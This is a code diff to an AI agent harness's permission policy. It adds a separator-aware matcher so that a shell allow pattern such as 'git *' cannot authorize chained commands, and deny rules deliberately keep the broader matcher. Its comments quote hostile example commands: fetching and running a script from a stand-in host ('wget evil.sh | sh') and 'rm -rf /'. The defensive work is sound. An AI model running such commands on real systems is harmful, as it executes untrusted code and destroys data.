@@ -1,22 +1,22 @@
 import * as fs from 'node:fs/promises';
 import type { Context } from '../core/context.js';
 import type { InputReader } from '../types/input-reader.js';
-import type { PermissionDecision, PermissionPolicy, PermissionTrace, PermissionTraceStep, TrustPolicy } from '../types/permission.js';
+import type {
+  PermissionDecision,
+  PermissionPolicy,
+  PermissionTrace,
+  PermissionTraceStep,
+  TrustPolicy,
+} from '../types/permission.js';
 import type { Tool } from '../types/tool.js';
-import { getDangerousCapabilities, hasCapability, ToolCapabilities } from './capabilities.js';
-import {
-  type TrustPolicyDiagnostic,
-  validateTrustPolicy,
-} from './permission-policy-schema.js';
 import { atomicWrite } from '../utils/atomic-write.js';
-import { matchAny, matchGlob } from '../utils/glob-match.js';
+import { matchAny, matchAnyCommand, matchGlob } from '../utils/glob-match.js';
 import { LruCache } from '../utils/lru-cache.js';
 import { safeParse } from '../utils/safe-json.js';
 import { subjectForToolInput } from '../utils/tool-subject.js';
-import {
-  getInputString,
-  isClearlyDestructiveBashCommand,
-} from './yolo-risk.js';
+import { getDangerousCapabilities, hasCapability, ToolCapabilities } from './capabilities.js';
+import { type TrustPolicyDiagnostic, validateTrustPolicy } from './permission-policy-schema.js';
+import { getInputString, isClearlyDestructiveBashCommand } from './yolo-risk.js';
 
 /**
  * Match a computed subject against stored trust patterns.
@@ -35,6 +35,47 @@ import {
  */
 function matchesTrust(patterns: string[], subject: string): boolean {
   return patterns.includes(subject) || matchAny(patterns, subject);
+}
+
+/**
+ * Match a trust pattern against a shell command line, for ALLOW decisions only
+ * (WS-047).
+ *
+ * `matchesTrust` compiles `*` to `[^/]*`, which crosses `;`, `&` and `|`. On a
+ * path that is right; on a command it means a user who wrote `git *` also
+ * authorized `git status; wget evil.sh | sh`. `matchAnyCommand` stops the
+ * wildcard at shell separators, so the pattern authorizes what it appears to.
+ *
+ * DELIBERATELY NOT used for deny. This matcher is strictly narrower, and
+ * narrowing a deny pattern un-blocks whatever falls outside it: a deny of
+ * `git *` must keep matching `git status; rm -rf /`, because the user's intent
+ * there is "no git-shaped command gets through", not "only well-formed ones".
+ * Narrower is safer for allow and more dangerous for deny — hence two call
+ * sites with two matchers rather than one shared helper that picks.
+ *
+ * Exact equality is kept first for the same reason as `matchesTrust`: a stored
+ * "always" pattern is a prior subject, and glob-escaped brackets do not
+ * round-trip through the compiler (#15).
+ */
+function matchesCommandTrust(patterns: string[], subject: string): boolean {
+  return patterns.includes(subject) || matchAnyCommand(patterns, subject);
+}
+
+/**
+ * True when this tool's permission subject is a shell command line rather than
+ * a path, url, or name — i.e. when the stricter wildcard rules apply.
+ */
+function hasShellSubject(tool: Tool): boolean {
+  return (
+    tool.name === 'bash' ||
+    tool.name === 'shell' ||
+    tool.name === 'exec' ||
+    hasCapability(tool, [
+      ToolCapabilities.SHELL_ARBITRARY,
+      ToolCapabilities.SHELL_RESTRICTED,
+      ToolCapabilities.SHELL_EXEC,
+    ])
+  );
 }
 
 function shellCommandLineFromInput(input: unknown): string | undefined {
@@ -105,9 +146,9 @@ function inputPathLooksSensitive(input: unknown): boolean {
 }
 
 function shellCommandReadsSensitivePath(command: string): boolean {
-  const tokens = command
-    .match(/"[^"]*"|'[^']*'|\S+/g)
-    ?.map((token) => stripShellQuotes(token).toLowerCase()) ?? [];
+  const tokens =
+    command.match(/"[^"]*"|'[^']*'|\S+/g)?.map((token) => stripShellQuotes(token).toLowerCase()) ??
+    [];
   for (let i = 0; i < tokens.length; i++) {
     const token = tokens[i];
     if (!token) continue;
@@ -323,15 +364,17 @@ export class DefaultPermissionPolicy implements PermissionPolicy {
   }
 
   private _logDeny(tool: string, subject: string | undefined, reason: string): void {
-    console.warn(JSON.stringify({
-      level: 'warn',
-      event: 'permission.denied',
-      message: `Permission denied: ${tool}${subject ? ` (subject: ${subject})` : ''} — ${reason}`,
-      tool,
-      subject,
-      reason,
-      timestamp: new Date().toISOString(),
-    }));
+    console.warn(
+      JSON.stringify({
+        level: 'warn',
+        event: 'permission.denied',
+        message: `Permission denied: ${tool}${subject ? ` (subject: ${subject})` : ''} — ${reason}`,
+        tool,
+        subject,
+        reason,
+        timestamp: new Date().toISOString(),
+      }),
+    );
   }
 
   async evaluate(tool: Tool, input: unknown, ctx: Context): Promise<PermissionDecision> {
@@ -370,7 +413,11 @@ export class DefaultPermissionPolicy implements PermissionPolicy {
     //     from re-triggering the confirm prompt.
     if (this.sessionDenied.has(cacheKey)) {
       this._logDeny(tool.name, subject, 'session soft deny (user pressed no)');
-      const decision: PermissionDecision = { permission: 'deny', source: 'deny', reason: 'session soft deny (user pressed no)' };
+      const decision: PermissionDecision = {
+        permission: 'deny',
+        source: 'deny',
+        reason: 'session soft deny (user pressed no)',
+      };
       this._evalCache.set(cacheKey, decision);
       return decision;
     }
@@ -391,20 +438,36 @@ export class DefaultPermissionPolicy implements PermissionPolicy {
     // 4. Deny — absolute
     if (entry?.deny && subject && matchesTrust(entry.deny, subject)) {
       this._logDeny(tool.name, subject, 'matched deny pattern');
-      const decision: PermissionDecision = { permission: 'deny', source: 'deny', reason: 'matched deny pattern' };
+      const decision: PermissionDecision = {
+        permission: 'deny',
+        source: 'deny',
+        reason: 'matched deny pattern',
+      };
       this._evalCache.set(cacheKey, decision);
       return decision;
     }
     if (tool.permission === 'deny') {
       this._logDeny(tool.name, subject, 'tool default deny');
-      const decision: PermissionDecision = { permission: 'deny', source: 'default', reason: 'tool default deny' };
+      const decision: PermissionDecision = {
+        permission: 'deny',
+        source: 'default',
+        reason: 'tool default deny',
+      };
       this._evalCache.set(cacheKey, decision);
       return decision;
     }
 
     // 6. Allow (trust file)
-    if (entry?.allow && subject && matchesTrust(entry.allow, subject)) {
-      const decision: PermissionDecision = { permission: 'auto', source: 'trust', reason: 'matched allow pattern' };
+    // WS-047: shell subjects use the separator-aware matcher, so `git *` does
+    // not authorize `git status; wget evil.sh | sh`. The deny check above
+    // deliberately keeps the permissive matcher — see `matchesCommandTrust`.
+    const allowMatches = hasShellSubject(tool) ? matchesCommandTrust : matchesTrust;
+    if (entry?.allow && subject && allowMatches(entry.allow, subject)) {
+      const decision: PermissionDecision = {
+        permission: 'auto',
+        source: 'trust',
+        reason: 'matched allow pattern',
+      };
       this._evalCache.set(cacheKey, decision);
       return decision;
     }
@@ -497,7 +560,13 @@ export class DefaultPermissionPolicy implements PermissionPolicy {
     const hasInstallCap = hasCapability(tool, ToolCapabilities.PACKAGE_INSTALL);
     const hasConfigCap = hasCapability(tool, ToolCapabilities.CONFIG_MUTATE);
     const hasSubagentCap = hasCapability(tool, ToolCapabilities.SUBAGENT_SPAWN);
-    const isMutating = tool.mutating || hasWriteCap || hasShellCap || hasInstallCap || hasConfigCap || hasSubagentCap;
+    const isMutating =
+      tool.mutating ||
+      hasWriteCap ||
+      hasShellCap ||
+      hasInstallCap ||
+      hasConfigCap ||
+      hasSubagentCap;
     if (tool.permission === 'auto' && !isMutating) {
       const decision: PermissionDecision = { permission: 'auto', source: 'default' };
       this._evalCache.set(cacheKey, decision);
@@ -599,7 +668,6 @@ export class DefaultPermissionPolicy implements PermissionPolicy {
     this._evalCache.clear();
   }
 
-
   /**
    * Side-effect-free permission evaluation trace. Mirrors `evaluate()`
    * step-by-step without prompting the user, writing to trust files, or
@@ -626,61 +694,173 @@ export class DefaultPermissionPolicy implements PermissionPolicy {
     if (this.policyInvalid) {
       add('policy invalid', true, 'deny', 'deny', 'trust policy is invalid; all tools are denied');
       winnerIndex = 0;
-      return { toolName: tool.name, subject, steps, winnerIndex, decision: { permission: 'deny', source: 'deny', reason: 'trust policy is invalid' } };
+      return {
+        toolName: tool.name,
+        subject,
+        steps,
+        winnerIndex,
+        decision: { permission: 'deny', source: 'deny', reason: 'trust policy is invalid' },
+      };
     }
     add('policy valid', false, 'auto', 'default', 'trust policy loaded successfully');
 
     // Namespace entry resolution
     const namespaceEntry = this.findNamespaceEntry(tool.name);
     const entry = this.policy[tool.name] ?? namespaceEntry;
-    const namespaceSource = namespaceEntry ? `wildcard entry matched (${Object.keys(this.policy).find(k => k.includes('*') && matchGlob(k, tool.name))})` : 'no namespace match';
+    const namespaceSource = namespaceEntry
+      ? `wildcard entry matched (${Object.keys(this.policy).find((k) => k.includes('*') && matchGlob(k, tool.name))})`
+      : 'no namespace match';
 
     // 2. Session soft deny
     const cacheKey = `${tool.name}::${subject ?? tool.name}`;
     if (this.sessionDenied.has(cacheKey)) {
-      add('session soft deny', true, 'deny', 'deny', 'user pressed "no" earlier in this session — blocked until reload');
+      add(
+        'session soft deny',
+        true,
+        'deny',
+        'deny',
+        'user pressed "no" earlier in this session — blocked until reload',
+      );
       winnerIndex = steps.length - 1;
-      return { toolName: tool.name, subject, steps, winnerIndex, decision: { permission: 'deny', source: 'deny', reason: 'session soft deny (user pressed no)' } };
+      return {
+        toolName: tool.name,
+        subject,
+        steps,
+        winnerIndex,
+        decision: {
+          permission: 'deny',
+          source: 'deny',
+          reason: 'session soft deny (user pressed no)',
+        },
+      };
     }
-    add('session soft deny', false, 'deny', 'deny', 'no session-level soft deny for this tool+subject');
+    add(
+      'session soft deny',
+      false,
+      'deny',
+      'deny',
+      'no session-level soft deny for this tool+subject',
+    );
 
     // 3. Session soft allow (one-shot)
     if (this.sessionAllowed.has(cacheKey)) {
-      add('session soft allow', true, 'auto', 'trust', 'user pressed "yes" in current session — one-shot auto-approve (consumed)');
+      add(
+        'session soft allow',
+        true,
+        'auto',
+        'trust',
+        'user pressed "yes" in current session — one-shot auto-approve (consumed)',
+      );
       winnerIndex = steps.length - 1;
-      return { toolName: tool.name, subject, steps, winnerIndex, decision: { permission: 'auto', source: 'trust', reason: 'session one-shot allow (user pressed yes)' } };
+      return {
+        toolName: tool.name,
+        subject,
+        steps,
+        winnerIndex,
+        decision: {
+          permission: 'auto',
+          source: 'trust',
+          reason: 'session one-shot allow (user pressed yes)',
+        },
+      };
     }
-    add('session soft allow', false, 'auto', 'trust', 'no session-level one-shot allow for this tool+subject');
+    add(
+      'session soft allow',
+      false,
+      'auto',
+      'trust',
+      'no session-level one-shot allow for this tool+subject',
+    );
 
     // 4. Trust deny
     if (entry?.deny && subject && matchesTrust(entry.deny, subject)) {
-      add('trust deny', true, 'deny', 'deny', `subject "${subject}" matched a deny pattern in trust file`);
+      add(
+        'trust deny',
+        true,
+        'deny',
+        'deny',
+        `subject "${subject}" matched a deny pattern in trust file`,
+      );
       winnerIndex = steps.length - 1;
-      return { toolName: tool.name, subject, steps, winnerIndex, decision: { permission: 'deny', source: 'deny', reason: 'matched deny pattern' } };
+      return {
+        toolName: tool.name,
+        subject,
+        steps,
+        winnerIndex,
+        decision: { permission: 'deny', source: 'deny', reason: 'matched deny pattern' },
+      };
     }
-    add('trust deny', false, 'deny', 'deny', `no deny pattern matched (namespace: ${namespaceSource})`);
+    add(
+      'trust deny',
+      false,
+      'deny',
+      'deny',
+      `no deny pattern matched (namespace: ${namespaceSource})`,
+    );
 
     // 5. Tool default deny
     if (tool.permission === 'deny') {
-      add('tool default deny', true, 'deny', 'default', `tool "${tool.name}" has permission: deny by default`);
+      add(
+        'tool default deny',
+        true,
+        'deny',
+        'default',
+        `tool "${tool.name}" has permission: deny by default`,
+      );
       winnerIndex = steps.length - 1;
-      return { toolName: tool.name, subject, steps, winnerIndex, decision: { permission: 'deny', source: 'default', reason: 'tool default deny' } };
+      return {
+        toolName: tool.name,
+        subject,
+        steps,
+        winnerIndex,
+        decision: { permission: 'deny', source: 'default', reason: 'tool default deny' },
+      };
     }
-    add('tool default deny', false, 'deny', 'default', `tool "${tool.name}" has permission: "${tool.permission}"`);
+    add(
+      'tool default deny',
+      false,
+      'deny',
+      'default',
+      `tool "${tool.name}" has permission: "${tool.permission}"`,
+    );
 
     // 6. Trust allow
     if (entry?.allow && subject && matchesTrust(entry.allow, subject)) {
-      add('trust allow', true, 'auto', 'trust', `subject "${subject}" matched an allow pattern in trust file`);
+      add(
+        'trust allow',
+        true,
+        'auto',
+        'trust',
+        `subject "${subject}" matched an allow pattern in trust file`,
+      );
       winnerIndex = steps.length - 1;
-      return { toolName: tool.name, subject, steps, winnerIndex, decision: { permission: 'auto', source: 'trust', reason: 'matched allow pattern' } };
+      return {
+        toolName: tool.name,
+        subject,
+        steps,
+        winnerIndex,
+        decision: { permission: 'auto', source: 'trust', reason: 'matched allow pattern' },
+      };
     }
-    add('trust allow', false, 'auto', 'trust', `no allow pattern matched (namespace: ${namespaceSource})`);
+    add(
+      'trust allow',
+      false,
+      'auto',
+      'trust',
+      `no allow pattern matched (namespace: ${namespaceSource})`,
+    );
 
     // 7. Trust auto
     if (entry?.auto) {
       add('trust auto', true, 'auto', 'trust', `trust file has auto: true for "${tool.name}"`);
       winnerIndex = steps.length - 1;
-      return { toolName: tool.name, subject, steps, winnerIndex, decision: { permission: 'auto', source: 'trust', reason: 'trust auto' } };
+      return {
+        toolName: tool.name,
+        subject,
+        steps,
+        winnerIndex,
+        decision: { permission: 'auto', source: 'trust', reason: 'trust auto' },
+      };
     }
     add('trust auto', false, 'auto', 'trust', `no auto flag for "${tool.name}" in trust file`);
 
@@ -697,9 +877,26 @@ export class DefaultPermissionPolicy implements PermissionPolicy {
           : 'sensitive file read detected — returns confirm (no prompt delegate)',
       );
       winnerIndex = steps.length - 1;
-      return { toolName: tool.name, subject, steps, winnerIndex, decision: { permission: 'confirm', source: 'default', riskTier: 'standard', reason: 'sensitive file read needs explicit approval' } };
+      return {
+        toolName: tool.name,
+        subject,
+        steps,
+        winnerIndex,
+        decision: {
+          permission: 'confirm',
+          source: 'default',
+          riskTier: 'standard',
+          reason: 'sensitive file read needs explicit approval',
+        },
+      };
     }
-    add('sensitive read', false, 'confirm', 'default', 'not a sensitive read call (or YOLO bypasses this check)');
+    add(
+      'sensitive read',
+      false,
+      'confirm',
+      'default',
+      'not a sensitive read call (or YOLO bypasses this check)',
+    );
 
     // 9. YOLO
     if (this.yolo) {
@@ -725,9 +922,21 @@ export class DefaultPermissionPolicy implements PermissionPolicy {
           },
         };
       }
-      add('yolo', true, 'auto', 'yolo', 'YOLO mode is active — auto-approving every non-denied call');
+      add(
+        'yolo',
+        true,
+        'auto',
+        'yolo',
+        'YOLO mode is active — auto-approving every non-denied call',
+      );
       winnerIndex = steps.length - 1;
-      return { toolName: tool.name, subject, steps, winnerIndex, decision: { permission: 'auto', source: 'yolo' } };
+      return {
+        toolName: tool.name,
+        subject,
+        steps,
+        winnerIndex,
+        decision: { permission: 'auto', source: 'yolo' },
+      };
     }
     add('yolo', false, 'auto', 'yolo', 'YOLO mode is not active');
 
@@ -745,10 +954,26 @@ export class DefaultPermissionPolicy implements PermissionPolicy {
       );
       if (hasRead) {
         winnerIndex = steps.length - 1;
-        return { toolName: tool.name, subject, steps, winnerIndex, decision: { permission: 'auto', source: 'context', reason: 'file already read in this session' } };
+        return {
+          toolName: tool.name,
+          subject,
+          steps,
+          winnerIndex,
+          decision: {
+            permission: 'auto',
+            source: 'context',
+            reason: 'file already read in this session',
+          },
+        };
       }
     } else {
-      add('write smart bypass', false, 'auto', 'context', 'tool is not "write" or has no subject — bypass does not apply');
+      add(
+        'write smart bypass',
+        false,
+        'auto',
+        'context',
+        'tool is not "write" or has no subject — bypass does not apply',
+      );
     }
 
     // 11. Tool default auto + non-mutating
@@ -761,11 +986,29 @@ export class DefaultPermissionPolicy implements PermissionPolicy {
     const hasInstallCap = hasCapability(tool, ToolCapabilities.PACKAGE_INSTALL);
     const hasConfigCap = hasCapability(tool, ToolCapabilities.CONFIG_MUTATE);
     const hasSubagentCap = hasCapability(tool, ToolCapabilities.SUBAGENT_SPAWN);
-    const isMutating = tool.mutating || hasWriteCap || hasShellCap || hasInstallCap || hasConfigCap || hasSubagentCap;
+    const isMutating =
+      tool.mutating ||
+      hasWriteCap ||
+      hasShellCap ||
+      hasInstallCap ||
+      hasConfigCap ||
+      hasSubagentCap;
     if (tool.permission === 'auto' && !isMutating) {
-      add('safe default auto', true, 'auto', 'default', `tool "${tool.name}" has auto permission and is not mutating — safe to auto-approve`);
+      add(
+        'safe default auto',
+        true,
+        'auto',
+        'default',
+        `tool "${tool.name}" has auto permission and is not mutating — safe to auto-approve`,
+      );
       winnerIndex = steps.length - 1;
-      return { toolName: tool.name, subject, steps, winnerIndex, decision: { permission: 'auto', source: 'default' } };
+      return {
+        toolName: tool.name,
+        subject,
+        steps,
+        winnerIndex,
+        decision: { permission: 'auto', source: 'default' },
+      };
     }
     add(
       'mutating default confirm',
@@ -866,13 +1109,14 @@ export class AutoApprovePermissionPolicy implements PermissionPolicy {
       dangerousNotAllowed.length > 0;
 
     if (blocked) {
-      const reason = isMcp && !mcpProxyAllowed
-        ? `MCP tool ${tool.name} is not auto-approved for subagents — ask the leader to allow mcp.proxy explicitly`
-        : tool.permission === 'deny'
-          ? 'tool default deny'
-          : dangerousNotAllowed.length > 0
-            ? `tool requires un-granted dangerous capability (needs: ${dangerousNotAllowed.join(', ')}, allowed: ${this.allowedCapabilities.join(', ')})`
-            : `tool lacks allowed capability (has: ${caps.join(', ') || 'none'}, allowed: ${this.allowedCapabilities.join(', ')})`;
+      const reason =
+        isMcp && !mcpProxyAllowed
+          ? `MCP tool ${tool.name} is not auto-approved for subagents — ask the leader to allow mcp.proxy explicitly`
+          : tool.permission === 'deny'
+            ? 'tool default deny'
+            : dangerousNotAllowed.length > 0
+              ? `tool requires un-granted dangerous capability (needs: ${dangerousNotAllowed.join(', ')}, allowed: ${this.allowedCapabilities.join(', ')})`
+              : `tool lacks allowed capability (has: ${caps.join(', ') || 'none'}, allowed: ${this.allowedCapabilities.join(', ')})`;
 
       return {
         permission: 'deny',
